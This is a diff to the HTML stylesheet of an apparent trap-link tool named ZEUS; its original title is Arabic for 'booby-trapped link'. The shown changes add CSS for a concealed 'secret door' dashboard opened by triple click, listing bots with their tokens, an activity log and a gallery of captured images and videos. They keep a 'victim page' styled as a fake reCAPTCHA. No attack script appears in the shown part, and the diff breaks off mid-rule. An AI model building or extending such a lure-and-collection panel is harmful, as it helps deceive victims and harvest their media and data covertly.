@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>ZEUS — رابط مُلغَّم</title>
+    <title>ZEUS — النظام المتكامل</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
     <style>
         /* ================================================================
            𝕾𝖙𝖞𝖑𝖊𝖘 — ZEUS (بدون إيموجي، كل الأيقونات SVG)
+           الباب السري مخفي تماماً — لا توجد أي علامة
            ================================================================ */
         *,
         *::before,
@@ -39,6 +40,38 @@
             --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
             --font-ar: 'Amiri', serif;
             --font-en: 'Inter', sans-serif;
+            --shadow-dash: 0 20px 60px rgba(0, 0, 0, 0.30), 0 0 80px rgba(0, 0, 0, 0.10);
+            --sidebar-width: 240px;
+            --header-height: 68px;
+            --bg-sidebar: rgba(30, 28, 24, 0.92);
+            --bg-content: #f5f0e8;
+            --text-light: #f0ede8;
+            --text-muted: #aaa49a;
+            --card-bg: rgba(255, 253, 249, 0.7);
+            --border-color: rgba(184, 148, 46, 0.12);
+            --shadow-sm: 0 2px 12px rgba(0, 0, 0, 0.04);
+            --shadow-md: 0 8px 30px rgba(0, 0, 0, 0.08);
+        }
+
+        /* Dark mode */
+        [data-theme="dark"] {
+            --bg-body: #181614;
+            --bg-panel: rgba(30, 28, 24, 0.92);
+            --bg-card: rgba(40, 38, 34, 0.8);
+            --bg-input: rgba(50, 47, 42, 0.6);
+            --ink: #ede8e0;
+            --ink-2: #b8b0a4;
+            --ink-faint: #7a7266;
+            --line: rgba(184, 148, 46, 0.15);
+            --bg-sidebar: rgba(20, 18, 14, 0.96);
+            --bg-content: #181614;
+            --text-light: #ede8e0;
+            --text-muted: #7a7266;
+            --card-bg: rgba(40, 38, 34, 0.7);
+            --border-color: rgba(184, 148, 46, 0.12);
+            --shadow-sm: 0 2px 12px rgba(0, 0, 0, 0.3);
+            --shadow-md: 0 8px 30px rgba(0, 0, 0, 0.4);
+            --gold-soft: rgba(184, 148, 46, 0.10);
         }
 
         body {
@@ -53,6 +86,7 @@
             line-height: 1.6;
             position: relative;
             overflow-x: hidden;
+            transition: background 0.3s, color 0.3s;
         }
 
         body::before {
@@ -67,6 +101,7 @@
             z-index: 0;
         }
 
+        /* ===== PANEL ===== */
         .panel {
             max-width: 880px;
             width: 100%;
@@ -81,6 +116,13 @@
             z-index: 1;
             opacity: 0;
             animation: fadeUp .8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            transition: background 0.3s, border-color 0.3s;
+        }
+
+        [data-theme="dark"] .panel {
+            background: var(--bg-panel);
+            border-color: rgba(184, 148, 46, 0.08);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.3);
         }
 
         .panel::after {
@@ -154,6 +196,8 @@
             display: flex;
             align-items: center;
             gap: 14px;
+            cursor: default;
+            user-select: none;
         }
 
         .logo {
@@ -161,6 +205,7 @@
             height: 56px;
             flex-shrink: 0;
             position: relative;
+            cursor: pointer;
         }
 
         .logo svg {
@@ -212,6 +257,13 @@
             -webkit-text-fill-color: transparent;
             background-clip: text;
             font-weight: 700;
+            cursor: pointer;
+            user-select: none;
+            transition: var(--transition);
+        }
+
+        .name:hover {
+            transform: scale(1.01);
         }
 
         .info {
@@ -238,6 +290,11 @@
             border: 1px solid rgba(184, 148, 46, 0.06);
         }
 
+        [data-theme="dark"] .info .row {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(184, 148, 46, 0.08);
+        }
+
         .info .row .icon {
             width: 15px;
             height: 15px;
@@ -247,77 +304,31 @@
             flex-shrink: 0;
         }
 
-        .online {
+        /* Theme toggle button in top bar */
+        .theme-toggle {
+            background: var(--bg-input);
+            border: 1px solid var(--line);
+            border-radius: 30px;
+            padding: 4px 14px;
+            cursor: pointer;
+            color: var(--ink-2);
+            font-size: 13px;
             display: flex;
             align-items: center;
-            gap: 8px;
-            font-family: var(--font-en);
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--gold-deep);
-            letter-spacing: 0.5px;
-            background: var(--gold-soft);
-            padding: 5px 16px 5px 12px;
-            border-radius: 40px;
-            border: 1px solid rgba(184, 148, 46, 0.20);
-            cursor: pointer;
+            gap: 6px;
             transition: var(--transition);
-            user-select: none;
-            position: relative;
+            font-family: var(--font-en);
         }
-
-        .online:hover {
-            background: rgba(184, 148, 46, 0.22);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 20px rgba(184, 148, 46, 0.15);
+        .theme-toggle:hover {
+            border-color: var(--gold);
+            color: var(--gold);
         }
-
-        .online:active {
-            transform: translateY(0);
-        }
-
-        .online .dot {
-            width: 8px;
-            height: 8px;
-            background: var(--success);
-            border-radius: 50%;
-            animation: onlinePulse 1.6s ease-in-out infinite;
-            box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
-            flex-shrink: 0;
-        }
-
-        @keyframes onlinePulse {
-            0%,
-            100% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
-            }
-            50% {
-                transform: scale(1.6);
-                box-shadow: 0 0 20px rgba(26, 138, 74, 0.20);
-            }
-        }
-
-        .online .lock-icon {
-            width: 14px;
-            height: 14px;
-            stroke: var(--gold);
+        .theme-toggle svg {
+            width: 16px;
+            height: 16px;
+            stroke: currentColor;
             fill: none;
             stroke-width: 2;
-            flex-shrink: 0;
-            margin-right: 2px;
-            opacity: 0.5;
-            transition: var(--transition);
-        }
-
-        .online:hover .lock-icon {
-            opacity: 1;
-        }
-
-        .online .badge-text {
-            display: flex;
-            align-items: center;
-            gap: 4px;
         }
 
         @media (max-width: 680px) {
@@ -341,6 +352,10 @@
                 width: 48px;
                 height: 48px;
             }
+            .theme-toggle {
+                font-size: 12px;
+                padding: 2px 10px;
+            }
         }
         @media (max-width: 420px) {
             .info .row {
@@ -350,10 +365,6 @@
             .info .row .icon {
                 width: 13px;
                 height: 13px;
-            }
-            .online {
-                font-size: 10px;
-                padding: 4px 12px 4px 8px;
             }
             .name {
                 font-size: 22px;
@@ -390,6 +401,11 @@
             transition: var(--transition);
             position: relative;
             overflow: hidden;
+        }
+
+        [data-theme="dark"] .card {
+            background: var(--bg-card);
+            border-color: rgba(184, 148, 46, 0.06);
         }
 
         .card::before {
@@ -448,6 +464,10 @@
             border-color: var(--gold);
             box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
             background: rgba(255, 255, 255, 0.6);
+        }
+
+        [data-theme="dark"] .card .input-wrap:focus-within {
+            background: rgba(255, 255, 255, 0.08);
         }
 
         .card .input-wrap input {
@@ -516,6 +536,10 @@
             background: rgba(255, 255, 255, 0.6);
         }
 
+        [data-theme="dark"] .zeus-toggle:hover {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
         .zeus-toggle input {
             position: absolute;
             opacity: 0;
@@ -554,6 +578,10 @@
             transition: var(--transition);
             box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
             flex-shrink: 0;
+        }
+
+        [data-theme="dark"] .zeus-toggle .track {
+            background: #3a3630;
         }
 
         .zeus-toggle .track .thumb {
@@ -804,6 +832,11 @@
             justify-content: center;
         }
 
+        [data-theme="dark"] .result .actions button {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: rgba(184, 148, 46, 0.08);
+        }
+
         .result .actions button svg {
             width: 18px;
             height: 18px;
@@ -819,6 +852,10 @@
             color: var(--gold);
             box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 20px rgba(184, 148, 46, 0.06);
             background: rgba(255, 255, 255, 0.7);
+        }
+
+        [data-theme="dark"] .result .actions button:hover {
+            background: rgba(255, 255, 255, 0.08);
         }
 
         .result .actions button:active {
@@ -954,7 +991,598 @@
             }
         }
 
-        /* ===== VICTIM PAGE (reCAPTCHA) ===== */
+        /* ================================================================
+           DASHBOARD — الباب السري (مخفي تماماً، يُفتح بالنقر الثلاثي)
+           ================================================================ */
+        .dash-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: rgba(10, 8, 6, 0.75);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            display: none;
+            overflow: hidden;
+            animation: dashFadeIn 0.5s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        .dash-overlay.active {
+            display: flex;
+        }
+
+        @keyframes dashFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .dash-container {
+            width: 100%;
+            height: 100%;
+            background: var(--bg-content);
+            display: flex;
+            flex-direction: row;
+            overflow: hidden;
+            position: relative;
+            transition: background 0.3s;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .dash-sidebar {
+            width: var(--sidebar-width);
+            min-width: var(--sidebar-width);
+            background: var(--bg-sidebar);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-right: 1px solid rgba(184, 148, 46, 0.08);
+            display: flex;
+            flex-direction: column;
+            padding: 20px 0;
+            height: 100%;
+            overflow-y: auto;
+            transition: background 0.3s, border-color 0.3s;
+            flex-shrink: 0;
+        }
+
+        .dash-sidebar::-webkit-scrollbar {
+            width: 3px;
+        }
+        .dash-sidebar::-webkit-scrollbar-thumb {
+            background: var(--gold);
+            border-radius: 10px;
+        }
+
+        .dash-sidebar .sidebar-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0 20px 20px 20px;
+            border-bottom: 1px solid rgba(184, 148, 46, 0.06);
+            margin-bottom: 16px;
+        }
+
+        .dash-sidebar .sidebar-brand .brand-icon {
+            width: 40px;
+            height: 40px;
+        }
+        .dash-sidebar .sidebar-brand .brand-icon svg {
+            width: 100%;
+            height: 100%;
+            stroke: var(--gold);
+            fill: none;
+        }
+        .dash-sidebar .sidebar-brand .brand-text {
+            font-family: var(--font-ar);
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .dash-sidebar .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 20px;
+            color: var(--text-muted);
+            text-decoration: none;
+            font-family: var(--font-en);
+            font-size: 13px;
+            font-weight: 500;
+            transition: var(--transition);
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            position: relative;
+            letter-spacing: 0.3px;
+        }
+        .dash-sidebar .nav-item:hover {
+            background: rgba(184, 148, 46, 0.04);
+            color: var(--text-light);
+        }
+        .dash-sidebar .nav-item.active {
+            color: var(--gold);
+            border-left-color: var(--gold);
+            background: rgba(184, 148, 46, 0.06);
+        }
+        .dash-sidebar .nav-item svg {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+        }
+        .dash-sidebar .nav-item .badge {
+            margin-right: auto;
+            background: rgba(184, 148, 46, 0.12);
+            padding: 1px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            color: var(--gold);
+        }
+
+        .dash-sidebar .sidebar-footer {
+            margin-top: auto;
+            padding: 16px 20px;
+            border-top: 1px solid rgba(184, 148, 46, 0.06);
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .dash-sidebar .sidebar-footer .theme-toggle-dash {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(184, 148, 46, 0.08);
+            border-radius: 30px;
+            padding: 8px 16px;
+            cursor: pointer;
+            color: var(--text-muted);
+            font-size: 12px;
+            font-family: var(--font-en);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: var(--transition);
+            justify-content: center;
+        }
+        .dash-sidebar .sidebar-footer .theme-toggle-dash:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+        }
+        .dash-sidebar .sidebar-footer .theme-toggle-dash svg {
+            width: 16px;
+            height: 16px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .dash-sidebar .sidebar-footer .dash-close-btn {
+            background: rgba(217, 48, 37, 0.06);
+            border: 1px solid rgba(217, 48, 37, 0.08);
+            border-radius: 30px;
+            padding: 8px 16px;
+            cursor: pointer;
+            color: var(--text-muted);
+            font-size: 12px;
+            font-family: var(--font-en);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: var(--transition);
+            justify-content: center;
+        }
+        .dash-sidebar .sidebar-footer .dash-close-btn:hover {
+            border-color: #d93025;
+            color: #d93025;
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .dash-main {
+            flex: 1;
+            padding: 24px 32px 32px 32px;
+            overflow-y: auto;
+            height: 100%;
+            background: var(--bg-content);
+            transition: background 0.3s;
+        }
+
+        .dash-main::-webkit-scrollbar {
+            width: 4px;
+        }
+        .dash-main::-webkit-scrollbar-thumb {
+            background: var(--gold);
+            border-radius: 10px;
+        }
+
+        .dash-main .page-title {
+            font-family: var(--font-ar);
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--ink);
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .dash-main .page-title .sub {
+            font-family: var(--font-en);
+            font-size: 13px;
+            font-weight: 400;
+            color: var(--ink-faint);
+        }
+        .dash-main .page-desc {
+            color: var(--ink-faint);
+            font-size: 14px;
+            margin-bottom: 24px;
+            font-family: var(--font-en);
+        }
+
+        /* ===== DASHBOARD STATS ===== */
+        .dash-stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 16px;
+            margin-bottom: 28px;
+        }
+
+        .dash-stat-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(8px);
+            border-radius: var(--radius-card);
+            padding: 18px 20px;
+            border: 1px solid var(--border-color);
+            transition: var(--transition);
+        }
+        .dash-stat-card:hover {
+            transform: translateY(-3px);
+            border-color: var(--gold);
+            box-shadow: var(--shadow-sm);
+        }
+        .dash-stat-card .stat-num {
+            font-size: 32px;
+            font-weight: 800;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: inline-block;
+            font-family: var(--font-en);
+        }
+        .dash-stat-card .stat-label {
+            font-size: 12px;
+            color: var(--ink-faint);
+            font-family: var(--font-en);
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+        .dash-stat-card .stat-change {
+            font-size: 11px;
+            font-family: var(--font-en);
+            margin-top: 6px;
+            color: var(--success);
+        }
+
+        /* ===== TAB CONTENT ===== */
+        .dash-tab-content {
+            display: none;
+            animation: fadeUp 0.4s ease;
+        }
+        .dash-tab-content.active {
+            display: block;
+        }
+
+        /* ===== BOT LIST ===== */
+        .bot-list-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 16px;
+        }
+
+        .bot-card {
+            background: var(--card-bg);
+            border-radius: var(--radius-card);
+            border: 1px solid var(--border-color);
+            padding: 16px 18px;
+            transition: var(--transition);
+            cursor: pointer;
+            position: relative;
+        }
+        .bot-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--gold);
+            box-shadow: var(--shadow-md);
+        }
+        .bot-card .bot-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+        .bot-card .bot-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: var(--gold-soft);
+            border: 2px solid var(--gold);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--gold);
+            flex-shrink: 0;
+            font-family: var(--font-en);
+        }
+        .bot-card .bot-name {
+            font-weight: 600;
+            font-size: 16px;
+            color: var(--ink);
+            font-family: var(--font-en);
+        }
+        .bot-card .bot-token {
+            font-size: 11px;
+            color: var(--ink-faint);
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .bot-card .bot-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 8px;
+            font-size: 11px;
+            color: var(--ink-faint);
+            font-family: var(--font-en);
+        }
+        .bot-card .bot-meta span {
+            background: var(--bg-input);
+            padding: 2px 10px;
+            border-radius: 20px;
+        }
+        .bot-card .bot-status {
+            position: absolute;
+            top: 16px;
+            left: 18px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--success);
+        }
+        .bot-card .bot-status.inactive {
+            background: #d93025;
+        }
+
+        /* ===== ACTIVITY LOG ===== */
+        .activity-timeline {
+            position: relative;
+            padding-left: 20px;
+        }
+        .activity-timeline::before {
+            content: '';
+            position: absolute;
+            left: 4px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--line);
+        }
+        .activity-item {
+            position: relative;
+            padding: 8px 0 8px 24px;
+            border-bottom: 1px solid var(--line);
+            font-size: 13px;
+            color: var(--ink-2);
+            font-family: var(--font-en);
+        }
+        .activity-item::before {
+            content: '';
+            position: absolute;
+            left: -4px;
+            top: 14px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--gold);
+            border: 2px solid var(--bg-content);
+        }
+        .activity-item .time {
+            font-size: 11px;
+            color: var(--ink-faint);
+            margin-right: 12px;
+        }
+        .activity-item .badge-type {
+            display: inline-block;
+            padding: 1px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            background: var(--gold-soft);
+            color: var(--gold);
+            margin-left: 8px;
+        }
+
+        /* ===== FILES GALLERY ===== */
+        .files-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 12px;
+        }
+        .file-item {
+            aspect-ratio: 1/1;
+            background: var(--bg-input);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        .file-item:hover {
+            transform: scale(1.03);
+            border-color: var(--gold);
+        }
+        .file-item img,
+        .file-item video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .file-item .file-icon {
+            font-size: 32px;
+            color: var(--ink-faint);
+        }
+        .file-item .file-label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px 8px;
+            font-size: 9px;
+            color: #fff;
+            text-align: center;
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            font-family: var(--font-en);
+            backdrop-filter: blur(4px);
+        }
+
+        /* ===== BOT DETAIL VIEW (inside tab) ===== */
+        .bot-detail-container {
+            background: var(--card-bg);
+            border-radius: var(--radius-card);
+            padding: 20px 24px;
+            border: 1px solid var(--border-color);
+            margin-top: 16px;
+        }
+        .bot-detail-container .detail-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px 24px;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--line);
+        }
+        .bot-detail-container .detail-row .label {
+            font-weight: 600;
+            color: var(--ink-faint);
+            min-width: 120px;
+            font-family: var(--font-en);
+            font-size: 12px;
+        }
+        .bot-detail-container .detail-row .value {
+            color: var(--ink);
+            font-family: var(--font-en);
+            font-size: 14px;
+            word-break: break-all;
+        }
+
+        /* ===== SEARCH / FILTER ===== */
+        .filter-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 20px;
+            align-items: center;
+        }
+        .filter-bar input,
+        .filter-bar select {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 30px;
+            padding: 8px 18px;
+            font-family: var(--font-en);
+            font-size: 13px;
+            color: var(--ink);
+            outline: none;
+            transition: var(--transition);
+            min-width: 160px;
+        }
+        .filter-bar input:focus,
+        .filter-bar select:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 3px var(--gold-soft);
+        }
+        .filter-bar input::placeholder {
+            color: var(--ink-faint);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 820px) {
+            .dash-sidebar {
+                width: 64px;
+                min-width: 64px;
+                padding: 12px 0;
+            }
+            .dash-sidebar .sidebar-brand .brand-text,
+            .dash-sidebar .nav-item span,
+            .dash-sidebar .nav-item .badge,
+            .dash-sidebar .sidebar-footer .theme-toggle-dash span,
+            .dash-sidebar .sidebar-footer .dash-close-btn span {
+                display: none;
+            }
+            .dash-sidebar .nav-item {
+                justify-content: center;
+                padding: 14px 0;
+                border-left: none;
+                border-bottom: 1px solid rgba(184, 148, 46, 0.04);
+            }
+            .dash-sidebar .nav-item.active {
+                border-left: none;
+                border-bottom-color: var(--gold);
+            }
+            .dash-sidebar .sidebar-brand {
+                justify-content: center;
+                padding: 0 0 16px 0;
+            }
+            .dash-sidebar .sidebar-footer .theme-toggle-dash,
+            .dash-sidebar .sidebar-footer .dash-close-btn {
+                justify-content: center;
+                padding: 8px;
+            }
+            .dash-main {
+                padding: 16px;
+            }
+            .dash-stats-grid {
+                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            }
+        }
+
+        @media (max-width: 480px) {
+            .dash-sidebar {
+                width: 48px;
+                min-width: 48px;
+            }
+            .dash-sidebar .nav-item svg {
+                width: 18px;
+                height: 18px;
+            }
+            .dash-main {
+                padding: 12px;
+            }
+            .bot-list-grid {
+                grid-template-columns: 1fr;
+            }
+            .files-gallery {
+                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            }
+        }
+
+        /* ================================================================
+           VICTIM PAGE (reCAPTCHA)
+           ================================================================ */
         #victimPage {
             display: none;
             justify-content: center;
@@ -1263,7 +1891,7 @@
             transform: translateY(20px) scale(0.96);
             transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
             pointer-events: none;
-            z-index: 9999;
+            z-index: 99999;
             direction: ltr;
             border: 1px solid rgba(255, 255, 255, 0.06);
         }
@@ -1281,115 +1909,106 @@
             background: #b8942e;
         }
 
-        /* ===== PASSWORD OVERLAY ===== */
-        .password-overlay {
+        /* ===== TOOLTIP للباب السري ===== */
+        .secret-hint {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(12px);
+            color: #fff;
+            padding: 8px 24px;
+            border-radius: 30px;
+            font-family: var(--font-en);
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+            z-index: 99998;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .secret-hint.show {
+            opacity: 1;
+        }
+
+        /* ===== CODE INPUT MODAL ===== */
+        .code-modal {
+            display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.45);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            z-index: 10000;
-            display: none;
+            z-index: 99997;
+            background: rgba(10, 8, 6, 0.75);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             align-items: center;
             justify-content: center;
             padding: 20px;
-            animation: fadeInOverlay 0.4s ease;
+            animation: dashFadeIn 0.4s cubic-bezier(0.22, 1, 0.36, 1) forwards;
         }
 
-        .password-overlay.active {
+        .code-modal.active {
             display: flex;
         }
 
-        @keyframes fadeInOverlay {
-            from {
-                opacity: 0;
-                transform: scale(0.96);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        .password-modal {
-            max-width: 400px;
+        .code-modal .modal-box {
+            max-width: 440px;
             width: 100%;
             background: var(--bg-panel);
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
             border-radius: var(--radius-card);
-            border: 1px solid rgba(184, 148, 46, 0.15);
-            padding: 36px 32px 32px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.20), 0 0 40px rgba(184, 148, 46, 0.04);
+            border: 1px solid rgba(184, 148, 46, 0.12);
+            padding: 32px 28px 28px;
+            box-shadow: var(--shadow-dash);
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
 
-        .password-modal::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.04) 0%, transparent 60%);
-            pointer-events: none;
-        }
-
-        .password-modal .modal-icon {
-            width: 64px;
-            height: 64px;
-            margin: 0 auto 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .password-modal .modal-icon svg {
-            width: 100%;
-            height: 100%;
-            stroke: var(--gold);
-            fill: none;
-            stroke-width: 1.8;
-        }
-
-        .password-modal .modal-title {
+        .code-modal .modal-box .modal-title {
             font-family: var(--font-ar);
             font-size: 22px;
             font-weight: 700;
-            color: var(--ink);
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
             margin-bottom: 4px;
         }
 
-        .password-modal .modal-sub {
+        .code-modal .modal-box .modal-sub {
+            color: var(--ink-faint);
             font-family: var(--font-en);
             font-size: 13px;
-            color: var(--ink-faint);
             margin-bottom: 20px;
         }
 
-        .password-modal .input-wrap {
+        .code-modal .modal-box .input-wrap {
             display: flex;
             align-items: center;
             background: var(--bg-input);
             border-radius: 16px;
             padding: 0 16px;
-            border: 1px solid rgba(184, 148, 46, 0.10);
+            border: 1px solid var(--line);
             transition: var(--transition);
             backdrop-filter: blur(4px);
             margin-bottom: 16px;
         }
 
-        .password-modal .input-wrap:focus-within {
+        .code-modal .modal-box .input-wrap:focus-within {
             border-color: var(--gold);
-            box-shadow: 0 0 0 4px var(--gold-soft);
+            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
             background: rgba(255, 255, 255, 0.6);
         }
 
-        .password-modal .input-wrap input {
+        .code-modal .modal-box .input-wrap input {
             flex: 1;
             border: none;
             outline: none;
             background: transparent;
-            padding: 14px 0;
+            padding: 13px 0;
             font-family: var(--font-en);
             font-size: 16px;
             font-weight: 500;
@@ -1400,86 +2019,114 @@
             min-width: 0;
         }
 
-        .password-modal .input-wrap input::placeholder {
+        .code-modal .modal-box .input-wrap input::placeholder {
             color: var(--ink-faint);
             letter-spacing: normal;
             font-weight: 400;
-            opacity: 0.6;
+            opacity: 0.5;
         }
 
-        .password-modal .btn-unlock {
-            width: 100%;
-            padding: 14px;
-            background: var(--gold-shimmer);
+        .code-modal .modal-box .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .code-modal .modal-box .modal-actions button {
+            padding: 10px 28px;
+            border-radius: 30px;
             border: none;
-            border-radius: 50px;
+            font-family: var(--font-en);
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            font-family: var(--font-en);
-            font-size: 15px;
-            font-weight: 700;
-            color: #fff;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.30);
             transition: var(--transition);
-            position: relative;
-            overflow: hidden;
+            letter-spacing: 0.5px;
         }
 
-        .password-modal .btn-unlock::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
-            transform: translateX(-100%);
-            transition: transform 0.6s;
+        .code-modal .modal-box .modal-actions .btn-confirm {
+            background: var(--gold-shimmer);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(184, 148, 46, 0.25);
         }
 
-        .password-modal .btn-unlock:hover::before {
-            transform: translateX(100%);
-        }
-
-        .password-modal .btn-unlock:hover {
+        .code-modal .modal-box .modal-actions .btn-confirm:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40);
+            box-shadow: 0 8px 30px rgba(184, 148, 46, 0.35);
         }
 
-        .password-modal .btn-unlock:active {
-            transform: translateY(0);
+        .code-modal .modal-box .modal-actions .btn-cancel {
+            background: var(--bg-input);
+            color: var(--ink-faint);
+            border: 1px solid var(--line);
         }
 
-        .password-modal .btn-unlock.error {
-            background: linear-gradient(135deg, #d93025, #b71c1c);
-            box-shadow: 0 4px 28px rgba(217, 48, 37, 0.30);
-            animation: shake 0.4s ease;
+        .code-modal .modal-box .modal-actions .btn-cancel:hover {
+            border-color: var(--gold);
+            color: var(--gold);
         }
 
-        @keyframes shake {
-            0%,
-            100% {
-                transform: translateX(0);
-            }
-            25% {
-                transform: translateX(-8px);
-            }
-            75% {
-                transform: translateX(8px);
-            }
-        }
-
-        .password-modal .error-msg {
+        .code-modal .modal-box .modal-error {
             color: #d93025;
-            font-family: var(--font-en);
             font-size: 13px;
-            margin-top: 10px;
+            margin-top: 12px;
+            font-family: var(--font-en);
             display: none;
-            font-weight: 500;
         }
 
-        .password-modal .error-msg.show {
+        .code-modal .modal-box .modal-error.show {
             display: block;
         }
 
-        .password-modal .modal-close {
+        /* ===== DEVELOPER PAGE (inside overlay) ===== */
+        .dev-page-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 99998;
+            background: rgba(10, 8, 6, 0.70);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .dev-page-overlay.active {
+            display: flex;
+        }
+        .dev-container {
+            max-width: 560px;
+            width: 100%;
+            background: var(--bg-panel);
+            backdrop-filter: blur(24px);
+            border-radius: var(--radius-card);
+            border: 1px solid rgba(184, 148, 46, 0.12);
+            padding: 32px 36px 28px;
